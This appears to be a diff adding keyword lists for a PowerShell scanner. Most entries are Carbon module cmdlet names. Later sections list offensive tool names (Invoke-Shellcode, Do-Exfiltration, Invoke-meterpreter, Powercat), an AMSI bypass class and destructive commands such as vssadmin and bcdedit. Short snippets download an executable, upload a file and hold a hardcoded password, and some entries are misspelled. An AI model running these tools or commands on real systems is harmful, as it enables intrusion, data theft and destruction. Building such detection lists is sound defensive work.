+# VIOLAZ PS_25S
+Remove-EnvironmentVariable
+# VIOLAZ PS_25S
+Disable-NtfsCompression
+# VIOLAZ PS_25S
+Enable-NtfsCompression
+# VIOLAZ PS_25S
+Expand-Item
+# VIOLAZ PS_25S
+Get-Permission
+# VIOLAZ PS_25S
+Grant-Permission
+# VIOLAZ PS_25S
+Install-Directory
+# VIOLAZ PS_25S
+Install-Junction
+# VIOLAZ PS_25S
+New-Junction
+# VIOLAZ PS_25S
+New-TempDirectory
+# VIOLAZ PS_25S
+Disable-AclInheritance
+# VIOLAZ PS_25S
+Enable-AclInheritance
+# VIOLAZ PS_25S
+Read-File
+# VIOLAZ PS_25S
+Remove-Junction
+# VIOLAZ PS_25S
+Revoke-Permission
+# VIOLAZ PS_25S
+Test-NtfsCompression
+# VIOLAZ PS_25S
+Test-PathIsJunction
+# VIOLAZ PS_25S
+Test-Permission
+# VIOLAZ PS_25S
+Test-ZipFile
+# VIOLAZ PS_25S
+Uninstall-Directory
+# VIOLAZ PS_25S
+Uninstall-Junction
+# VIOLAZ PS_25S
+Write-File
+# VIOLAZ PS_25S
+Assert-FirewallConfigurable
+# VIOLAZ PS_25S
+Carbon_FirewallRule
+# VIOLAZ PS_25S
+Disable-FirewallStatefulFtp
+# VIOLAZ PS_25S
+Enable-FirewallStatefulFtp
+# VIOLAZ PS_25S
+Get-FirewallRule
+# VIOLAZ PS_25S
+Test-FirewallStatefulFtp
+# VIOLAZ PS_25S
+Add-GroupMember
+# VIOLAZ PS_25S
+Carbon_Group
+# VIOLAZ PS_25S
+Carbon_Privilege
+# VIOLAZ PS_25S
+ConvertTo-SecurityIdentifier
+# VIOLAZ PS_25S
+Get-Group
+# VIOLAZ PS_25S
+Install-Group
+# VIOLAZ PS_25S
+Remove-GroupMember
+# VIOLAZ PS_25S
+Resolve-Identity
+# VIOLAZ PS_25S
+Resolve-IdentityName
+# VIOLAZ PS_25S
+Test-Group
+# VIOLAZ PS_25S
+Test-GroupMember
+# VIOLAZ PS_25S
+Test-Identity
+# VIOLAZ PS_25S
+Uninstall-Group
+# VIOLAZ PS_25S
+Get-PathToHostsFile
+# VIOLAZ PS_25S
+Remove-HostsEntry
+# VIOLAZ PS_25S
+Reset-HostsFile
+# VIOLAZ PS_25S
+Set-HostsEntry
+# VIOLAZ PS_25S
+Get-HttpUrlAcl
+# VIOLAZ PS_25S
+Grant-HttpUrlPermission
+# VIOLAZ PS_25S
+Revoke-HttpUrlPermission
+# VIOLAZ PS_25S
+Add-GroupMember
+# VIOLAZ PS_25S
+Carbon_Group
+# VIOLAZ PS_25S
+Carbon_Privilege
+# VIOLAZ PS_25S
+ConvertTo-SecurityIdentifier
+# VIOLAZ PS_25S
+Get-User
+# VIOLAZ PS_25S
+Get-WmiLocalUserAccount
+# VIOLAZ PS_25S
+Install-Group
+# VIOLAZ PS_25S
+Install-User
+# VIOLAZ PS_25S
+Remove-GroupMember
+# VIOLAZ PS_25S
+Resolve-Identity
+# VIOLAZ PS_25S
+Resolve-IdentityName
+# VIOLAZ PS_25S
+Test-Group
+# VIOLAZ PS_25S
+Test-GroupMember
+# VIOLAZ PS_25S
+Test-Identity
+# VIOLAZ PS_25S
+Test-User
+# VIOLAZ PS_25S
+Uninstall-Group
+# VIOLAZ PS_25S
+Uninstall-User
+# VIOLAZ PS_25S
+Add-IisDefaultDocument
+# VIOLAZ PS_25S
+Disable-IisSecurityAuthentication
+# VIOLAZ PS_25S
+Enable-IisDirectoryBrowsing
+# VIOLAZ PS_25S
+Enable-IisSecurityAuthentication
+# VIOLAZ PS_25S
+Enable-IisSsl
+# VIOLAZ PS_25S
+Get-IisApplication
+# VIOLAZ PS_25S
+Get-IisAppPool
+# VIOLAZ PS_25S
+Get-IisConfigurationSection
+# VIOLAZ PS_25S
+Get-IisHttpHeader
+# VIOLAZ PS_25S
+Get-IisHttpRedirect
+# VIOLAZ PS_25S
+Get-IisMimeMap
+# VIOLAZ PS_25S
+Get-IisSecurityAuthentication
+# VIOLAZ PS_25S
+Get-IisVersion
+# VIOLAZ PS_25S
+Get-IisWebsite
+# VIOLAZ PS_25S
+Install-IisApplication
+# VIOLAZ PS_25S
+Install-IisAppPool
+# VIOLAZ PS_25S
+Install-IisVirtualDirectory
+# VIOLAZ PS_25S
+Install-IisWebsite
+# VIOLAZ PS_25S
+Invoke-AppCmd
+# VIOLAZ PS_25S
+Join-IisVirtualPath
+# VIOLAZ PS_25S
+Lock-IisConfigurationSection
+# VIOLAZ PS_25S
+Remove-IisMimeMap
+# VIOLAZ PS_25S
+Remove-SslCertificateBinding
+# VIOLAZ PS_25S
+Set-IisHttpHeader
+# VIOLAZ PS_25S
+Set-IisHttpRedirect
+# VIOLAZ PS_25S
+Set-IisMimeMap
+# VIOLAZ PS_25S
+Set-IisWebsiteID
+# VIOLAZ PS_25S
+Set-IisWebsiteSslCertificate
+# VIOLAZ PS_25S
+Set-IisWindowsAuthentication
+# VIOLAZ PS_25S
+Set-SslCertificateBinding
+# VIOLAZ PS_25S
+Test-IisAppPool
+# VIOLAZ PS_25S
+Test-IisConfigurationSection
+# VIOLAZ PS_25S
+Test-IisSecurityAuthentication
+# VIOLAZ PS_25S
+Test-IisWebsite
+# VIOLAZ PS_25S
+Test-SslCertificateBinding
+# VIOLAZ PS_25S
+Uninstall-IisAppPool
+# VIOLAZ PS_25S
+Uninstall-IisWebsite
+# VIOLAZ PS_25S
+Unlock-IisConfigurationSection
+# VIOLAZ PS_25S
+Carbon_IniFile
+# VIOLAZ PS_25S
+Remove-IniEntry
+# VIOLAZ PS_25S
+Set-IniEntry
+# VIOLAZ PS_25S
+Split-Ini
+# VIOLAZ PS_25S
+Get-Msi
+# VIOLAZ PS_25S
+Get-ProgramInstallInfo
+# VIOLAZ PS_25S
+Install-Msi
+# VIOLAZ PS_25S
+Disable-IEEnhancedSecurityConfiguration
+# VIOLAZ PS_25S
+Enable-IEActivationPermission
+# VIOLAZ PS_25S
+Get-IPAddress
+# VIOLAZ PS_25S
+Test-IPAddress
+# VIOLAZ PS_25S
+Install-Junction
+# VIOLAZ PS_25S
+New-Junction
+# VIOLAZ PS_25S
+Remove-Junction
+# VIOLAZ PS_25S
+Test-PathIsJunction
+# VIOLAZ PS_25S
+Get-Msi
+# VIOLAZ PS_25S
+Get-ProgramInstallInfo
+# VIOLAZ PS_25S
+Install-Msi
+# VIOLAZ PS_25S
+Get-MsmqMessageQueue
+# VIOLAZ PS_25S
+Get-MsmqMessageQueuePath
+# VIOLAZ PS_25S
+Grant-MsmqMessageQueuePermission
+# VIOLAZ PS_25S
+Install-Msmq
+# VIOLAZ PS_25S
+Install-MsmqMessageQueue
+# VIOLAZ PS_25S
+Reset-MsmqQueueManagerID
+# VIOLAZ PS_25S
+Test-MsmqMessageQueue
+# VIOLAZ PS_25S
+Uninstall-MsmqMessageQueue
+# VIOLAZ PS_25S
+et-HttpUrlAcl
+# VIOLAZ PS_25S
+Grant-HttpUrlPermission
+# VIOLAZ PS_25S
+Revoke-HttpUrlPermission
+# VIOLAZ PS_25S
+Carbon_FirewallRule
+# VIOLAZ PS_25S
+Get-IPAddress
+# VIOLAZ PS_25S
+Test-IPAddress
+# VIOLAZ PS_25S
+Carbon_Permission
+# VIOLAZ PS_25S
+Disable-NtfsCompression
+# VIOLAZ PS_25S
+Enable-NtfsCompression
+# VIOLAZ PS_25S
+Get-Permission
+# VIOLAZ PS_25S
+Grant-Permission
+# VIOLAZ PS_25S
+Install-Directory
+# VIOLAZ PS_25S
+Install-Junction
+# VIOLAZ PS_25S
+New-Junction
+# VIOLAZ PS_25S
+Disable-AclInheritance
+# VIOLAZ PS_25S
+Enable-AclInheritance
+# VIOLAZ PS_25S
+Read-File
+# VIOLAZ PS_25S
+Remove-Junction
+# VIOLAZ PS_25S
+Revoke-Permission
+# VIOLAZ PS_25S
+Test-NtfsCompression
+# VIOLAZ PS_25S
+Test-PathIsJunction
+# VIOLAZ PS_25S
+Test-Permission
+# VIOLAZ PS_25S
+Uninstall-Directory
+# VIOLAZ PS_25S
+Write-File
+# VIOLAZ PS_25S
+Test-OSIs32Bit
+# VIOLAZ PS_25S
+Test-OSIs64Bit
+# VIOLAZ PS_25S
+Get-PathProvider
+# VIOLAZ PS_25S
+Resolve-FullPath
+# VIOLAZ PS_25S
+Resolve-PathCase
+# VIOLAZ PS_25S
+Resolve-RelativePath
+# VIOLAZ PS_25S
+Test-PathIsJunction
+# VIOLAZ PS_25S
+Test-UncPath
+# VIOLAZ PS_25S
+Get-PerformanceCounter
+# VIOLAZ PS_25S
+Install-PerformanceCounter
+# VIOLAZ PS_25S
+Test-PerformanceCounter
+# VIOLAZ PS_25S
+Test-PerformanceCounterCategory
+# VIOLAZ PS_25S
+Uninstall-PerformanceCounterCategory
+# VIOLAZ PS_25S
+Add-TrustedHost
+# VIOLAZ PS_25S
+Clear-TrustedHost
+# VIOLAZ PS_25S
+Complete-Job
+# VIOLAZ PS_25S
+Get-PathProvider
+# VIOLAZ PS_25S
+Get-PowerShellModuleInstallPath
+# VIOLAZ PS_25S
+Get-PowershellPath
+# VIOLAZ PS_25S
+Get-TrustedHost
+# VIOLAZ PS_25S
+Invoke-PowerShell
+# VIOLAZ PS_25S
+Set-TrustedHost
+# VIOLAZ PS_25S
+Test-PowerShellIs32Bit
+# VIOLAZ PS_25S
+Test-PowerShellIs64Bit
+# VIOLAZ PS_25S
+Test-TypeDataMember
+# VIOLAZ PS_25S
+Add-GroupMember
+# VIOLAZ PS_25S
+Carbon_Group
+# VIOLAZ PS_25S
+Carbon_Privilege
+# VIOLAZ PS_25S
+ConvertTo-SecurityIdentifier
+# VIOLAZ PS_25S
+Get-User
+# VIOLAZ PS_25S
+Get-WmiLocalUserAccount
+# VIOLAZ PS_25S
+Install-Group
+# VIOLAZ PS_25S
+Install-User
+# VIOLAZ PS_25S
+Remove-GroupMember
+# VIOLAZ PS_25S
+Resolve-Identity
+# VIOLAZ PS_25S
+Resolve-Identit
+# VIOLAZ PS_25SyName
+Test-Group
+# VIOLAZ PS_25S
+Test-GroupMember
+# VIOLAZ PS_25S
+Test-Identity
+# VIOLAZ PS_25S
+Test-User
+# VIOLAZ PS_25S
+Uninstall-Group
+# VIOLAZ PS_25S
+Uninstall-User
+# VIOLAZ PS_25S
+Privileges
+# VIOLAZ PS_25S
+Carbon_Privilege
+# VIOLAZ PS_25S
+Get-Privilege
+# VIOLAZ PS_25S
+Grant-Privilege
+# VIOLAZ PS_25S
+Revoke-Privilege
+# VIOLAZ PS_25S
+Test-Privilege
+# VIOLAZ PS_25S
+Get-ProgramInstallInfo
+# VIOLAZ PS_25S
+Install-Msi
+# VIOLAZ PS_25S
+Install-WindowsFeature
+# VIOLAZ PS_25S
+Uninstall-WindowsFeature
+# VIOLAZ PS_25S
+Registry
+# VIOLAZ PS_25S
+Carbon_Permission
+# VIOLAZ PS_25S
+Get-Permission
+# VIOLAZ PS_25S
+Get-RegistryKeyValue
+# VIOLAZ PS_25S
+Grant-Permission
+# VIOLAZ PS_25S
+Install-egistryKey
+# VIOLAZ PS_25S
+Remove-RegistryKeyValue
+# VIOLAZ PS_25S
+Revoke-Permission
+# VIOLAZ PS_25S
+Set-RegistryKeyValue
+# VIOLAZ PS_25S
+Test-Permission
+# VIOLAZ PS_25S
+Test-RegistryKeValue
+# VIOLAZ PS_25S
+New-RsaKeyPair
+# VIOLAZ PS_25S
+Scheduled Tasks
+# VIOLAZ PS_25S
+Carbon_ScheduledTask
+# VIOLAZ PS_25S
+Get-ScheduledTask
+# VIOLAZ PS_25S
+Install-ScheduledTask
+# VIOLAZ PS_25S
+Test-ScheduledTask
+# VIOLAZ PS_25S
+Uninstall-ScheduledTask
+# VIOLAZ PS_25S
+Assert-AdminPrivilege
+# VIOLAZ PS_25S
+Carbon_Permission
+# VIOLAZ PS_25S
+Carbon_Privilege
+# VIOLAZ PS_25S
+Convert-SecureStringToString
+# VIOLAZ PS_25S
+ConvertTo-ContainerInheritanceFlags
+# VIOLAZ PS_25S
+ConvertTo-InheritanceFlag
+# VIOLAZ PS_25S
+ConvertTo-PropagationFlag
+# VIOLAZ PS_25S
+Get-ComPermission
+# VIOLAZ PS_25S
+Get-ComSecurityDescriptor
+# VIOLAZ PS_25S
+Get-FileSharePermission
+# VIOLAZ PS_25S
+Get-HttpUrlAcl
+# VIOLAZ PS_25S
+Get-Permission
+# VIOLAZ PS_25S
+Get-ServicePermission
+# VIOLAZ PS_25S
+Grant-HttpUrlPermission
+# VIOLAZ PS_25S
+Grant-Permission
+# VIOLAZ PS_25S
+Grant-Privilege
+# VIOLAZ PS_25S
+Grant-ServiceControlPermission
+# VIOLAZ PS_25S
+Grant-ServicePermission
+# VIOLAZ PS_25S
+New-Credential
+# VIOLAZ PS_25S
+Disable-AclInheritance
+# VIOLAZ PS_25S
+Enable-AclInheritance
+# VIOLAZ PS_25S
+Resolve-Identity
+# VIOLAZ PS_25S
+Resolve-IdentityName
+# VIOLAZ PS_25S
+Revoke-ComPermission
+# VIOLAZ PS_25S
+Revoke-HttpUrlPermission
+# VIOLAZ PS_25S
+Revoke-Permission
+# VIOLAZ PS_25S
+Revoke-Privilege
+# VIOLAZ PS_25S
+Revoke-ServicePermission
+# VIOLAZ PS_25S
+Set-ServiceAcl
+# VIOLAZ PS_25S
+Test-AdminPrivilege
+# VIOLAZ PS_25S
+Test-Identity
+# VIOLAZ PS_25S
+Test-Permission
+# VIOLAZ PS_25S
+Test-Privilege
+# VIOLAZ PS_25S
+Unprotect-String
+# VIOLAZ PS_25S
+Assert-Service
+# VIOLAZ PS_25S
+Carbon_Service
+# VIOLAZ PS_25S
+Get-ServiceAcl
+# VIOLAZ PS_25S
+Get-ServiceConfiguration
+# VIOLAZ PS_25S
+Get-ServicePermission
+# VIOLAZ PS_25S
+Get-ServiceSecurityDescriptor
+# VIOLAZ PS_25S
+Grant-ServiceControlPermission
+# VIOLAZ PS_25S
+Grant-ServicePermission
+# VIOLAZ PS_25S
+Install-Service
+# VIOLAZ PS_25S
+Restart-RemoteService
+# VIOLAZ PS_25S
+Revoke-ServicePermission
+# VIOLAZ PS_25S
+Set-ServiceAcl
+# VIOLAZ PS_25S
+Test-Service
+# VIOLAZ PS_25S
+Uninstall-Service
+# VIOLAZ PS_25S
+Get-FileShare
+# VIOLAZ PS_25S
+Get-FileSharePermission
+# VIOLAZ PS_25S
+Install-FileShare
+# VIOLAZ PS_25S
+Test-FileShare
+# VIOLAZ PS_25S
+Uninstall-FileShare
+# VIOLAZ PS_25S
+ConvertTo-SecurityIdentifier
+# VIOLAZ PS_25S
+Resolve-Identity
+# VIOLAZ PS_25S
+Resolve-IdentityName
+# VIOLAZ PS_25S
+Test-Identity
+# VIOLAZ PS_25S
+Get-FileShare
+# VIOLAZ PS_25S
+Get-FileSharePermission
+# VIOLAZ PS_25S
+Install-FileShare
+# VIOLAZ PS_25S
+Test-FileShare
+# VIOLAZ PS_25S
+Remove-SslCertificateBinding
+# VIOLAZ PS_25S
+Set-SslCertificateBinding
+# VIOLAZ PS_25S
+Test-SslCertificateBinding
+# VIOLAZ PS_25S
+Carbon_IniFile
+# VIOLAZ PS_25S
+ConvertFrom-Base64
+# VIOLAZ PS_25S
+ConvertTo-Base64
+# VIOLAZ PS_25S
+Convert-XmlFile
+# VIOLAZ PS_25S
+Read-File
+# VIOLAZ PS_25S
+Remove-IniEntry
+# VIOLAZ PS_25S
+Set-IniEntry
+# VIOLAZ PS_25S
+Split-Ini
+# VIOLAZ PS_25S
+Write-File
+# VIOLAZ PS_25S
+Trusted Host
+# VIOLAZ PS_25S
+Add-TrustedHost
+# VIOLAZ PS_25S
+Clear-TrustedHost
+# VIOLAZ PS_25S
+Set-TrustedHost
+# VIOLAZ PS_25S
+Carbon_Privilege
+# VIOLAZ PS_25S
+ConvertTo-SecurityIdentifier
+# VIOLAZ PS_25S
+Find-ADUser
+# VIOLAZ PS_25S
+Get-User
+# VIOLAZ PS_25S
+Get-WmiLocalUserAccount
+# VIOLAZ PS_25S
+Install-User
+# VIOLAZ PS_25S
+Resolve-Identity
+# VIOLAZ PS_25S
+Resolve-IdentityName
+# VIOLAZ PS_25S
+Test-Identity
+# VIOLAZ PS_25S
+Test-User
+# VIOLAZ PS_25S
+Uninstall-User
+# VIOLAZ PS_25S
+Get-HttpUrlAcl
+# VIOLAZ PS_25S
+Grant-HttpUrlPermission
+# VIOLAZ PS_25S
+Revoke-HttpUrlPermission
+# VIOLAZ PS_25S
+Get-WindowsFeature
+# VIOLAZ PS_25S
+Install-WindowsFeature
+# VIOLAZ PS_25S
+Test-WindowsFeature
+# VIOLAZ PS_25S
+Uninstall-WindowsFeature
+# VIOLAZ PS_25S
+Install-Service
+
+# VIOLAZ PS_26S
+Get-RegBinary
+Get-RegDefault
+Get-RegDWord
+Get-RegExpandString
+Get-RegKey          
+Get-RegMultiString
+Get-RegQWord
+Get-RegString
+Get-RegValue
+New-RegKey
+Remove-RegKey
+Remove-RegValue     
+Set-RegBinary       
+Set-RegDefault     
+Set-RegDWord     
+Set-RegExpandString
+Set-RegMultiString
+Set-RegQWord      
+Set-RegString       
+Test-RegKey         
+Test-RegValue      
+
+# VIOLAZ PS_27S
+Import-Module ./Invoke-Obfuscation.psd1
+# VIOLAZ PS_27S
+Invoke-Obfuscation
+
+# VIOLAZ PS_28S
+Get-Attack
+Invoke-Shellcode
+Invoke-WMICommand
+Invoke-WMIExec
+Invoke-SMBExec
+Invoke-NinjaCopy
+Invoke-SMBClient
+Get-WLAN-Keys
+Get-VolumeShadowCopy
+New-VolumeShadowCopy
+Remove-VolumeShadowCopy
+Mount-VolumeShadowCopy
+Set-MacAttribute
+Get-IpAddress
+Get-Proxy
+Get-PathAcl
+Get-UserProperty
+Get-ComputerProperty
+Find-InterestingFile
+Invoke-CheckLocalAdminAccess
+Get-Domain*
+Get-ObjectAcl
+Add-ObjectAcl
+Get-LastLoggedOn
+Get-CachedRDPConnection
+Invoke-ACLScanner
+Get-GUIDMap
+Get-DomainSID
+Invoke-ThreadedFunction
+Get-Net*
+Add-Net*
+Set-ADO*
+Get-Gpt*
+Find-GPO*
+Invoke-User*
+Invoke-Stealth*
+Find-Foreign*
+Invoke-MapDomainTrust
+Invoke-ShareFinder
+Invoke-FileFinder
+Find-Local*
+Find-User*
+Find-Computer*
+Get-ExploitableSystem
+Invoke-EnumerateLocalAdmin
+Get-Service*
+Invoke-Service*
+Write-Service*
+Install-Service*
+Restore-Service*
+Find-DLL*
+Find-Path*
+Write-HijackDll
+Get-Reg*
+Get-Vuln*
+Get-UnattendedInstallFile
+Get-Webconfig
+Get-ApplicationHost
+Write-User*
+Invoke-AllChecks
+Gupt-Backdoor
+Do-Exfiltration
+DNS-TXT-Pwnage
+Get-Information
+Get-WLAN-Keys
+Invoke-PsUACme
+Invoke-Inveigh
+Get-Inveigh*
+Stop-Inveigh
+Watch-Inveigh
+Powercat
+Invoke-meterpreter
+
+# VIOLAZ PS_29S
+System. Management.Automation.AmsiUtils 
+
+# VIOLAZ PS_30S
+Get-StaticBcdStore
+Import-Store
+Set-PartitionDeviceElement
+Set-FileDeviceElement
+Set-ObjectListElement
+bcedit
+bcdedit
+sc stop
+vssadmin
+
+# VIOLAZ PS_31S
+Babadook.ps1 
+
+# VIOLAZ SuspiciousBankingCheck
+checkout
+Pay-me_know
+Sign On
+Sign In
+Register
+Credit Card
+Debit Card
+Place your Order
+Banking
+Account
+Log In
+Log On
+Login
+Logon
+One Time
+LogMeIn
+Reservation
+POS
+Virtual Terminal
+Payment
+
+# VIOLAZ PS_32S
+%username”
+Ipconfig
+net view
+net user administration
+net stat
+systemInfo
+Invoke-wmiMethod
+Win32_OperatingSystem
+Win32_ComputerSystem
+CIM_DataFile
+Win32_Volume
+StdRegProv
+Win32_NtLogEvent
+Win32_LoggedOnUser
+Win32_Share
+Win32_QuickFixEngineering
+Win32_NetworkAdapter
+Win32_BIOS
+Win32_Printer
+Win32_logicaldisk
+Win32_SystemEnclosure
+BootupState
+HKLM:
+HKEY_LOCAL_MACHINE
+HKEY_CURRENT_USER
+HKCU:
+HKCR:
+HKEY_CLASSES_ROOT
+HKEY_USERS
+HKUS:
+HKU:
+HKEY_CURRENT_CONFIG
+HKCC: 
+Get-PSDrive
+smartctl
+UI.RawUI
+
+# VIOLAZ PS_33S
+WMIC
+[WMICLASS]
+Get-WmiObject 
+Get-CimAssociatedInstance
+Get-CimClass
+Get-CimInstance
+Get-CimSession
+Set-WmiInstance
+Set-CimInstance
+Invoke-WmiMethod
+Invoke-CimMethod
+New-CimInstance
+New-CimSession
+New-CimSessionOption
+Register-CimIndicationEvent
+Register-WmiEvent
+Remove-CimInstance
+Remove-WmiObject
+Remove-CimSession
+__NamespaceOperationEvent 
+__NamespaceModificationEvent 
+ __NamespaceDeletionEvent 
+ 		__NamespaceCreationEvent 
+__ClassOperationEvent 
+__ClassDeletionEvent 
+ __ClassModificationEvent 
+__ClassCreationEvent 
+__InstanceOperationEvent
+ __InstanceCreationEvent
+ __MethodInvocationEvent
+ __InstanceModificationEvent
+ __InstanceDeletionEvent
+ __TimerEvent
+ROOT\CIMV2:Win32_ComputerShutdownEvent 
+ROOT\CIMV2:Win32_IP4RouteTableEvent
+ROOT\CIMV2:Win32_ProcessStartTrace
+ROOT\CIMV2:Win32_ModuleLoadTrace
+ROOT\CIMV2:Win32_ThreadStartTrace
+ROOT\CIMV2:Win32_VolumeChangeEvent
+ROOT\CIMV2:Msft_WmiProvider*
+ROOT\DEFAULT:RegistryKeyChangeEvent
+ROOT\DEFAULT:RegistryValueChangeEvent
+root\wmi
+WMIGen
+
+# VIOLAZ PS_34S
+$url = "http://www.contoso.com/pathtoexe.exe"
+$outpath = "$PSScriptRoot/myexe.exe"
+Invoke-WebRequest -Uri $url -OutFile $outpath
+$wc = New-Object System.Net.WebClient
+$wc.DownloadFile($url, $outpath) # VIOLAZ PS_34S
+# VIOLAZ PS_35S
+$resp = $wc.UploadFile($uri,$uploadPath)
+# VIOLAZ PS_36S
+$webclient.Credentials = New-Object System.Net.NetworkCredential($user,”secretPWD”)  
+
+
+
+
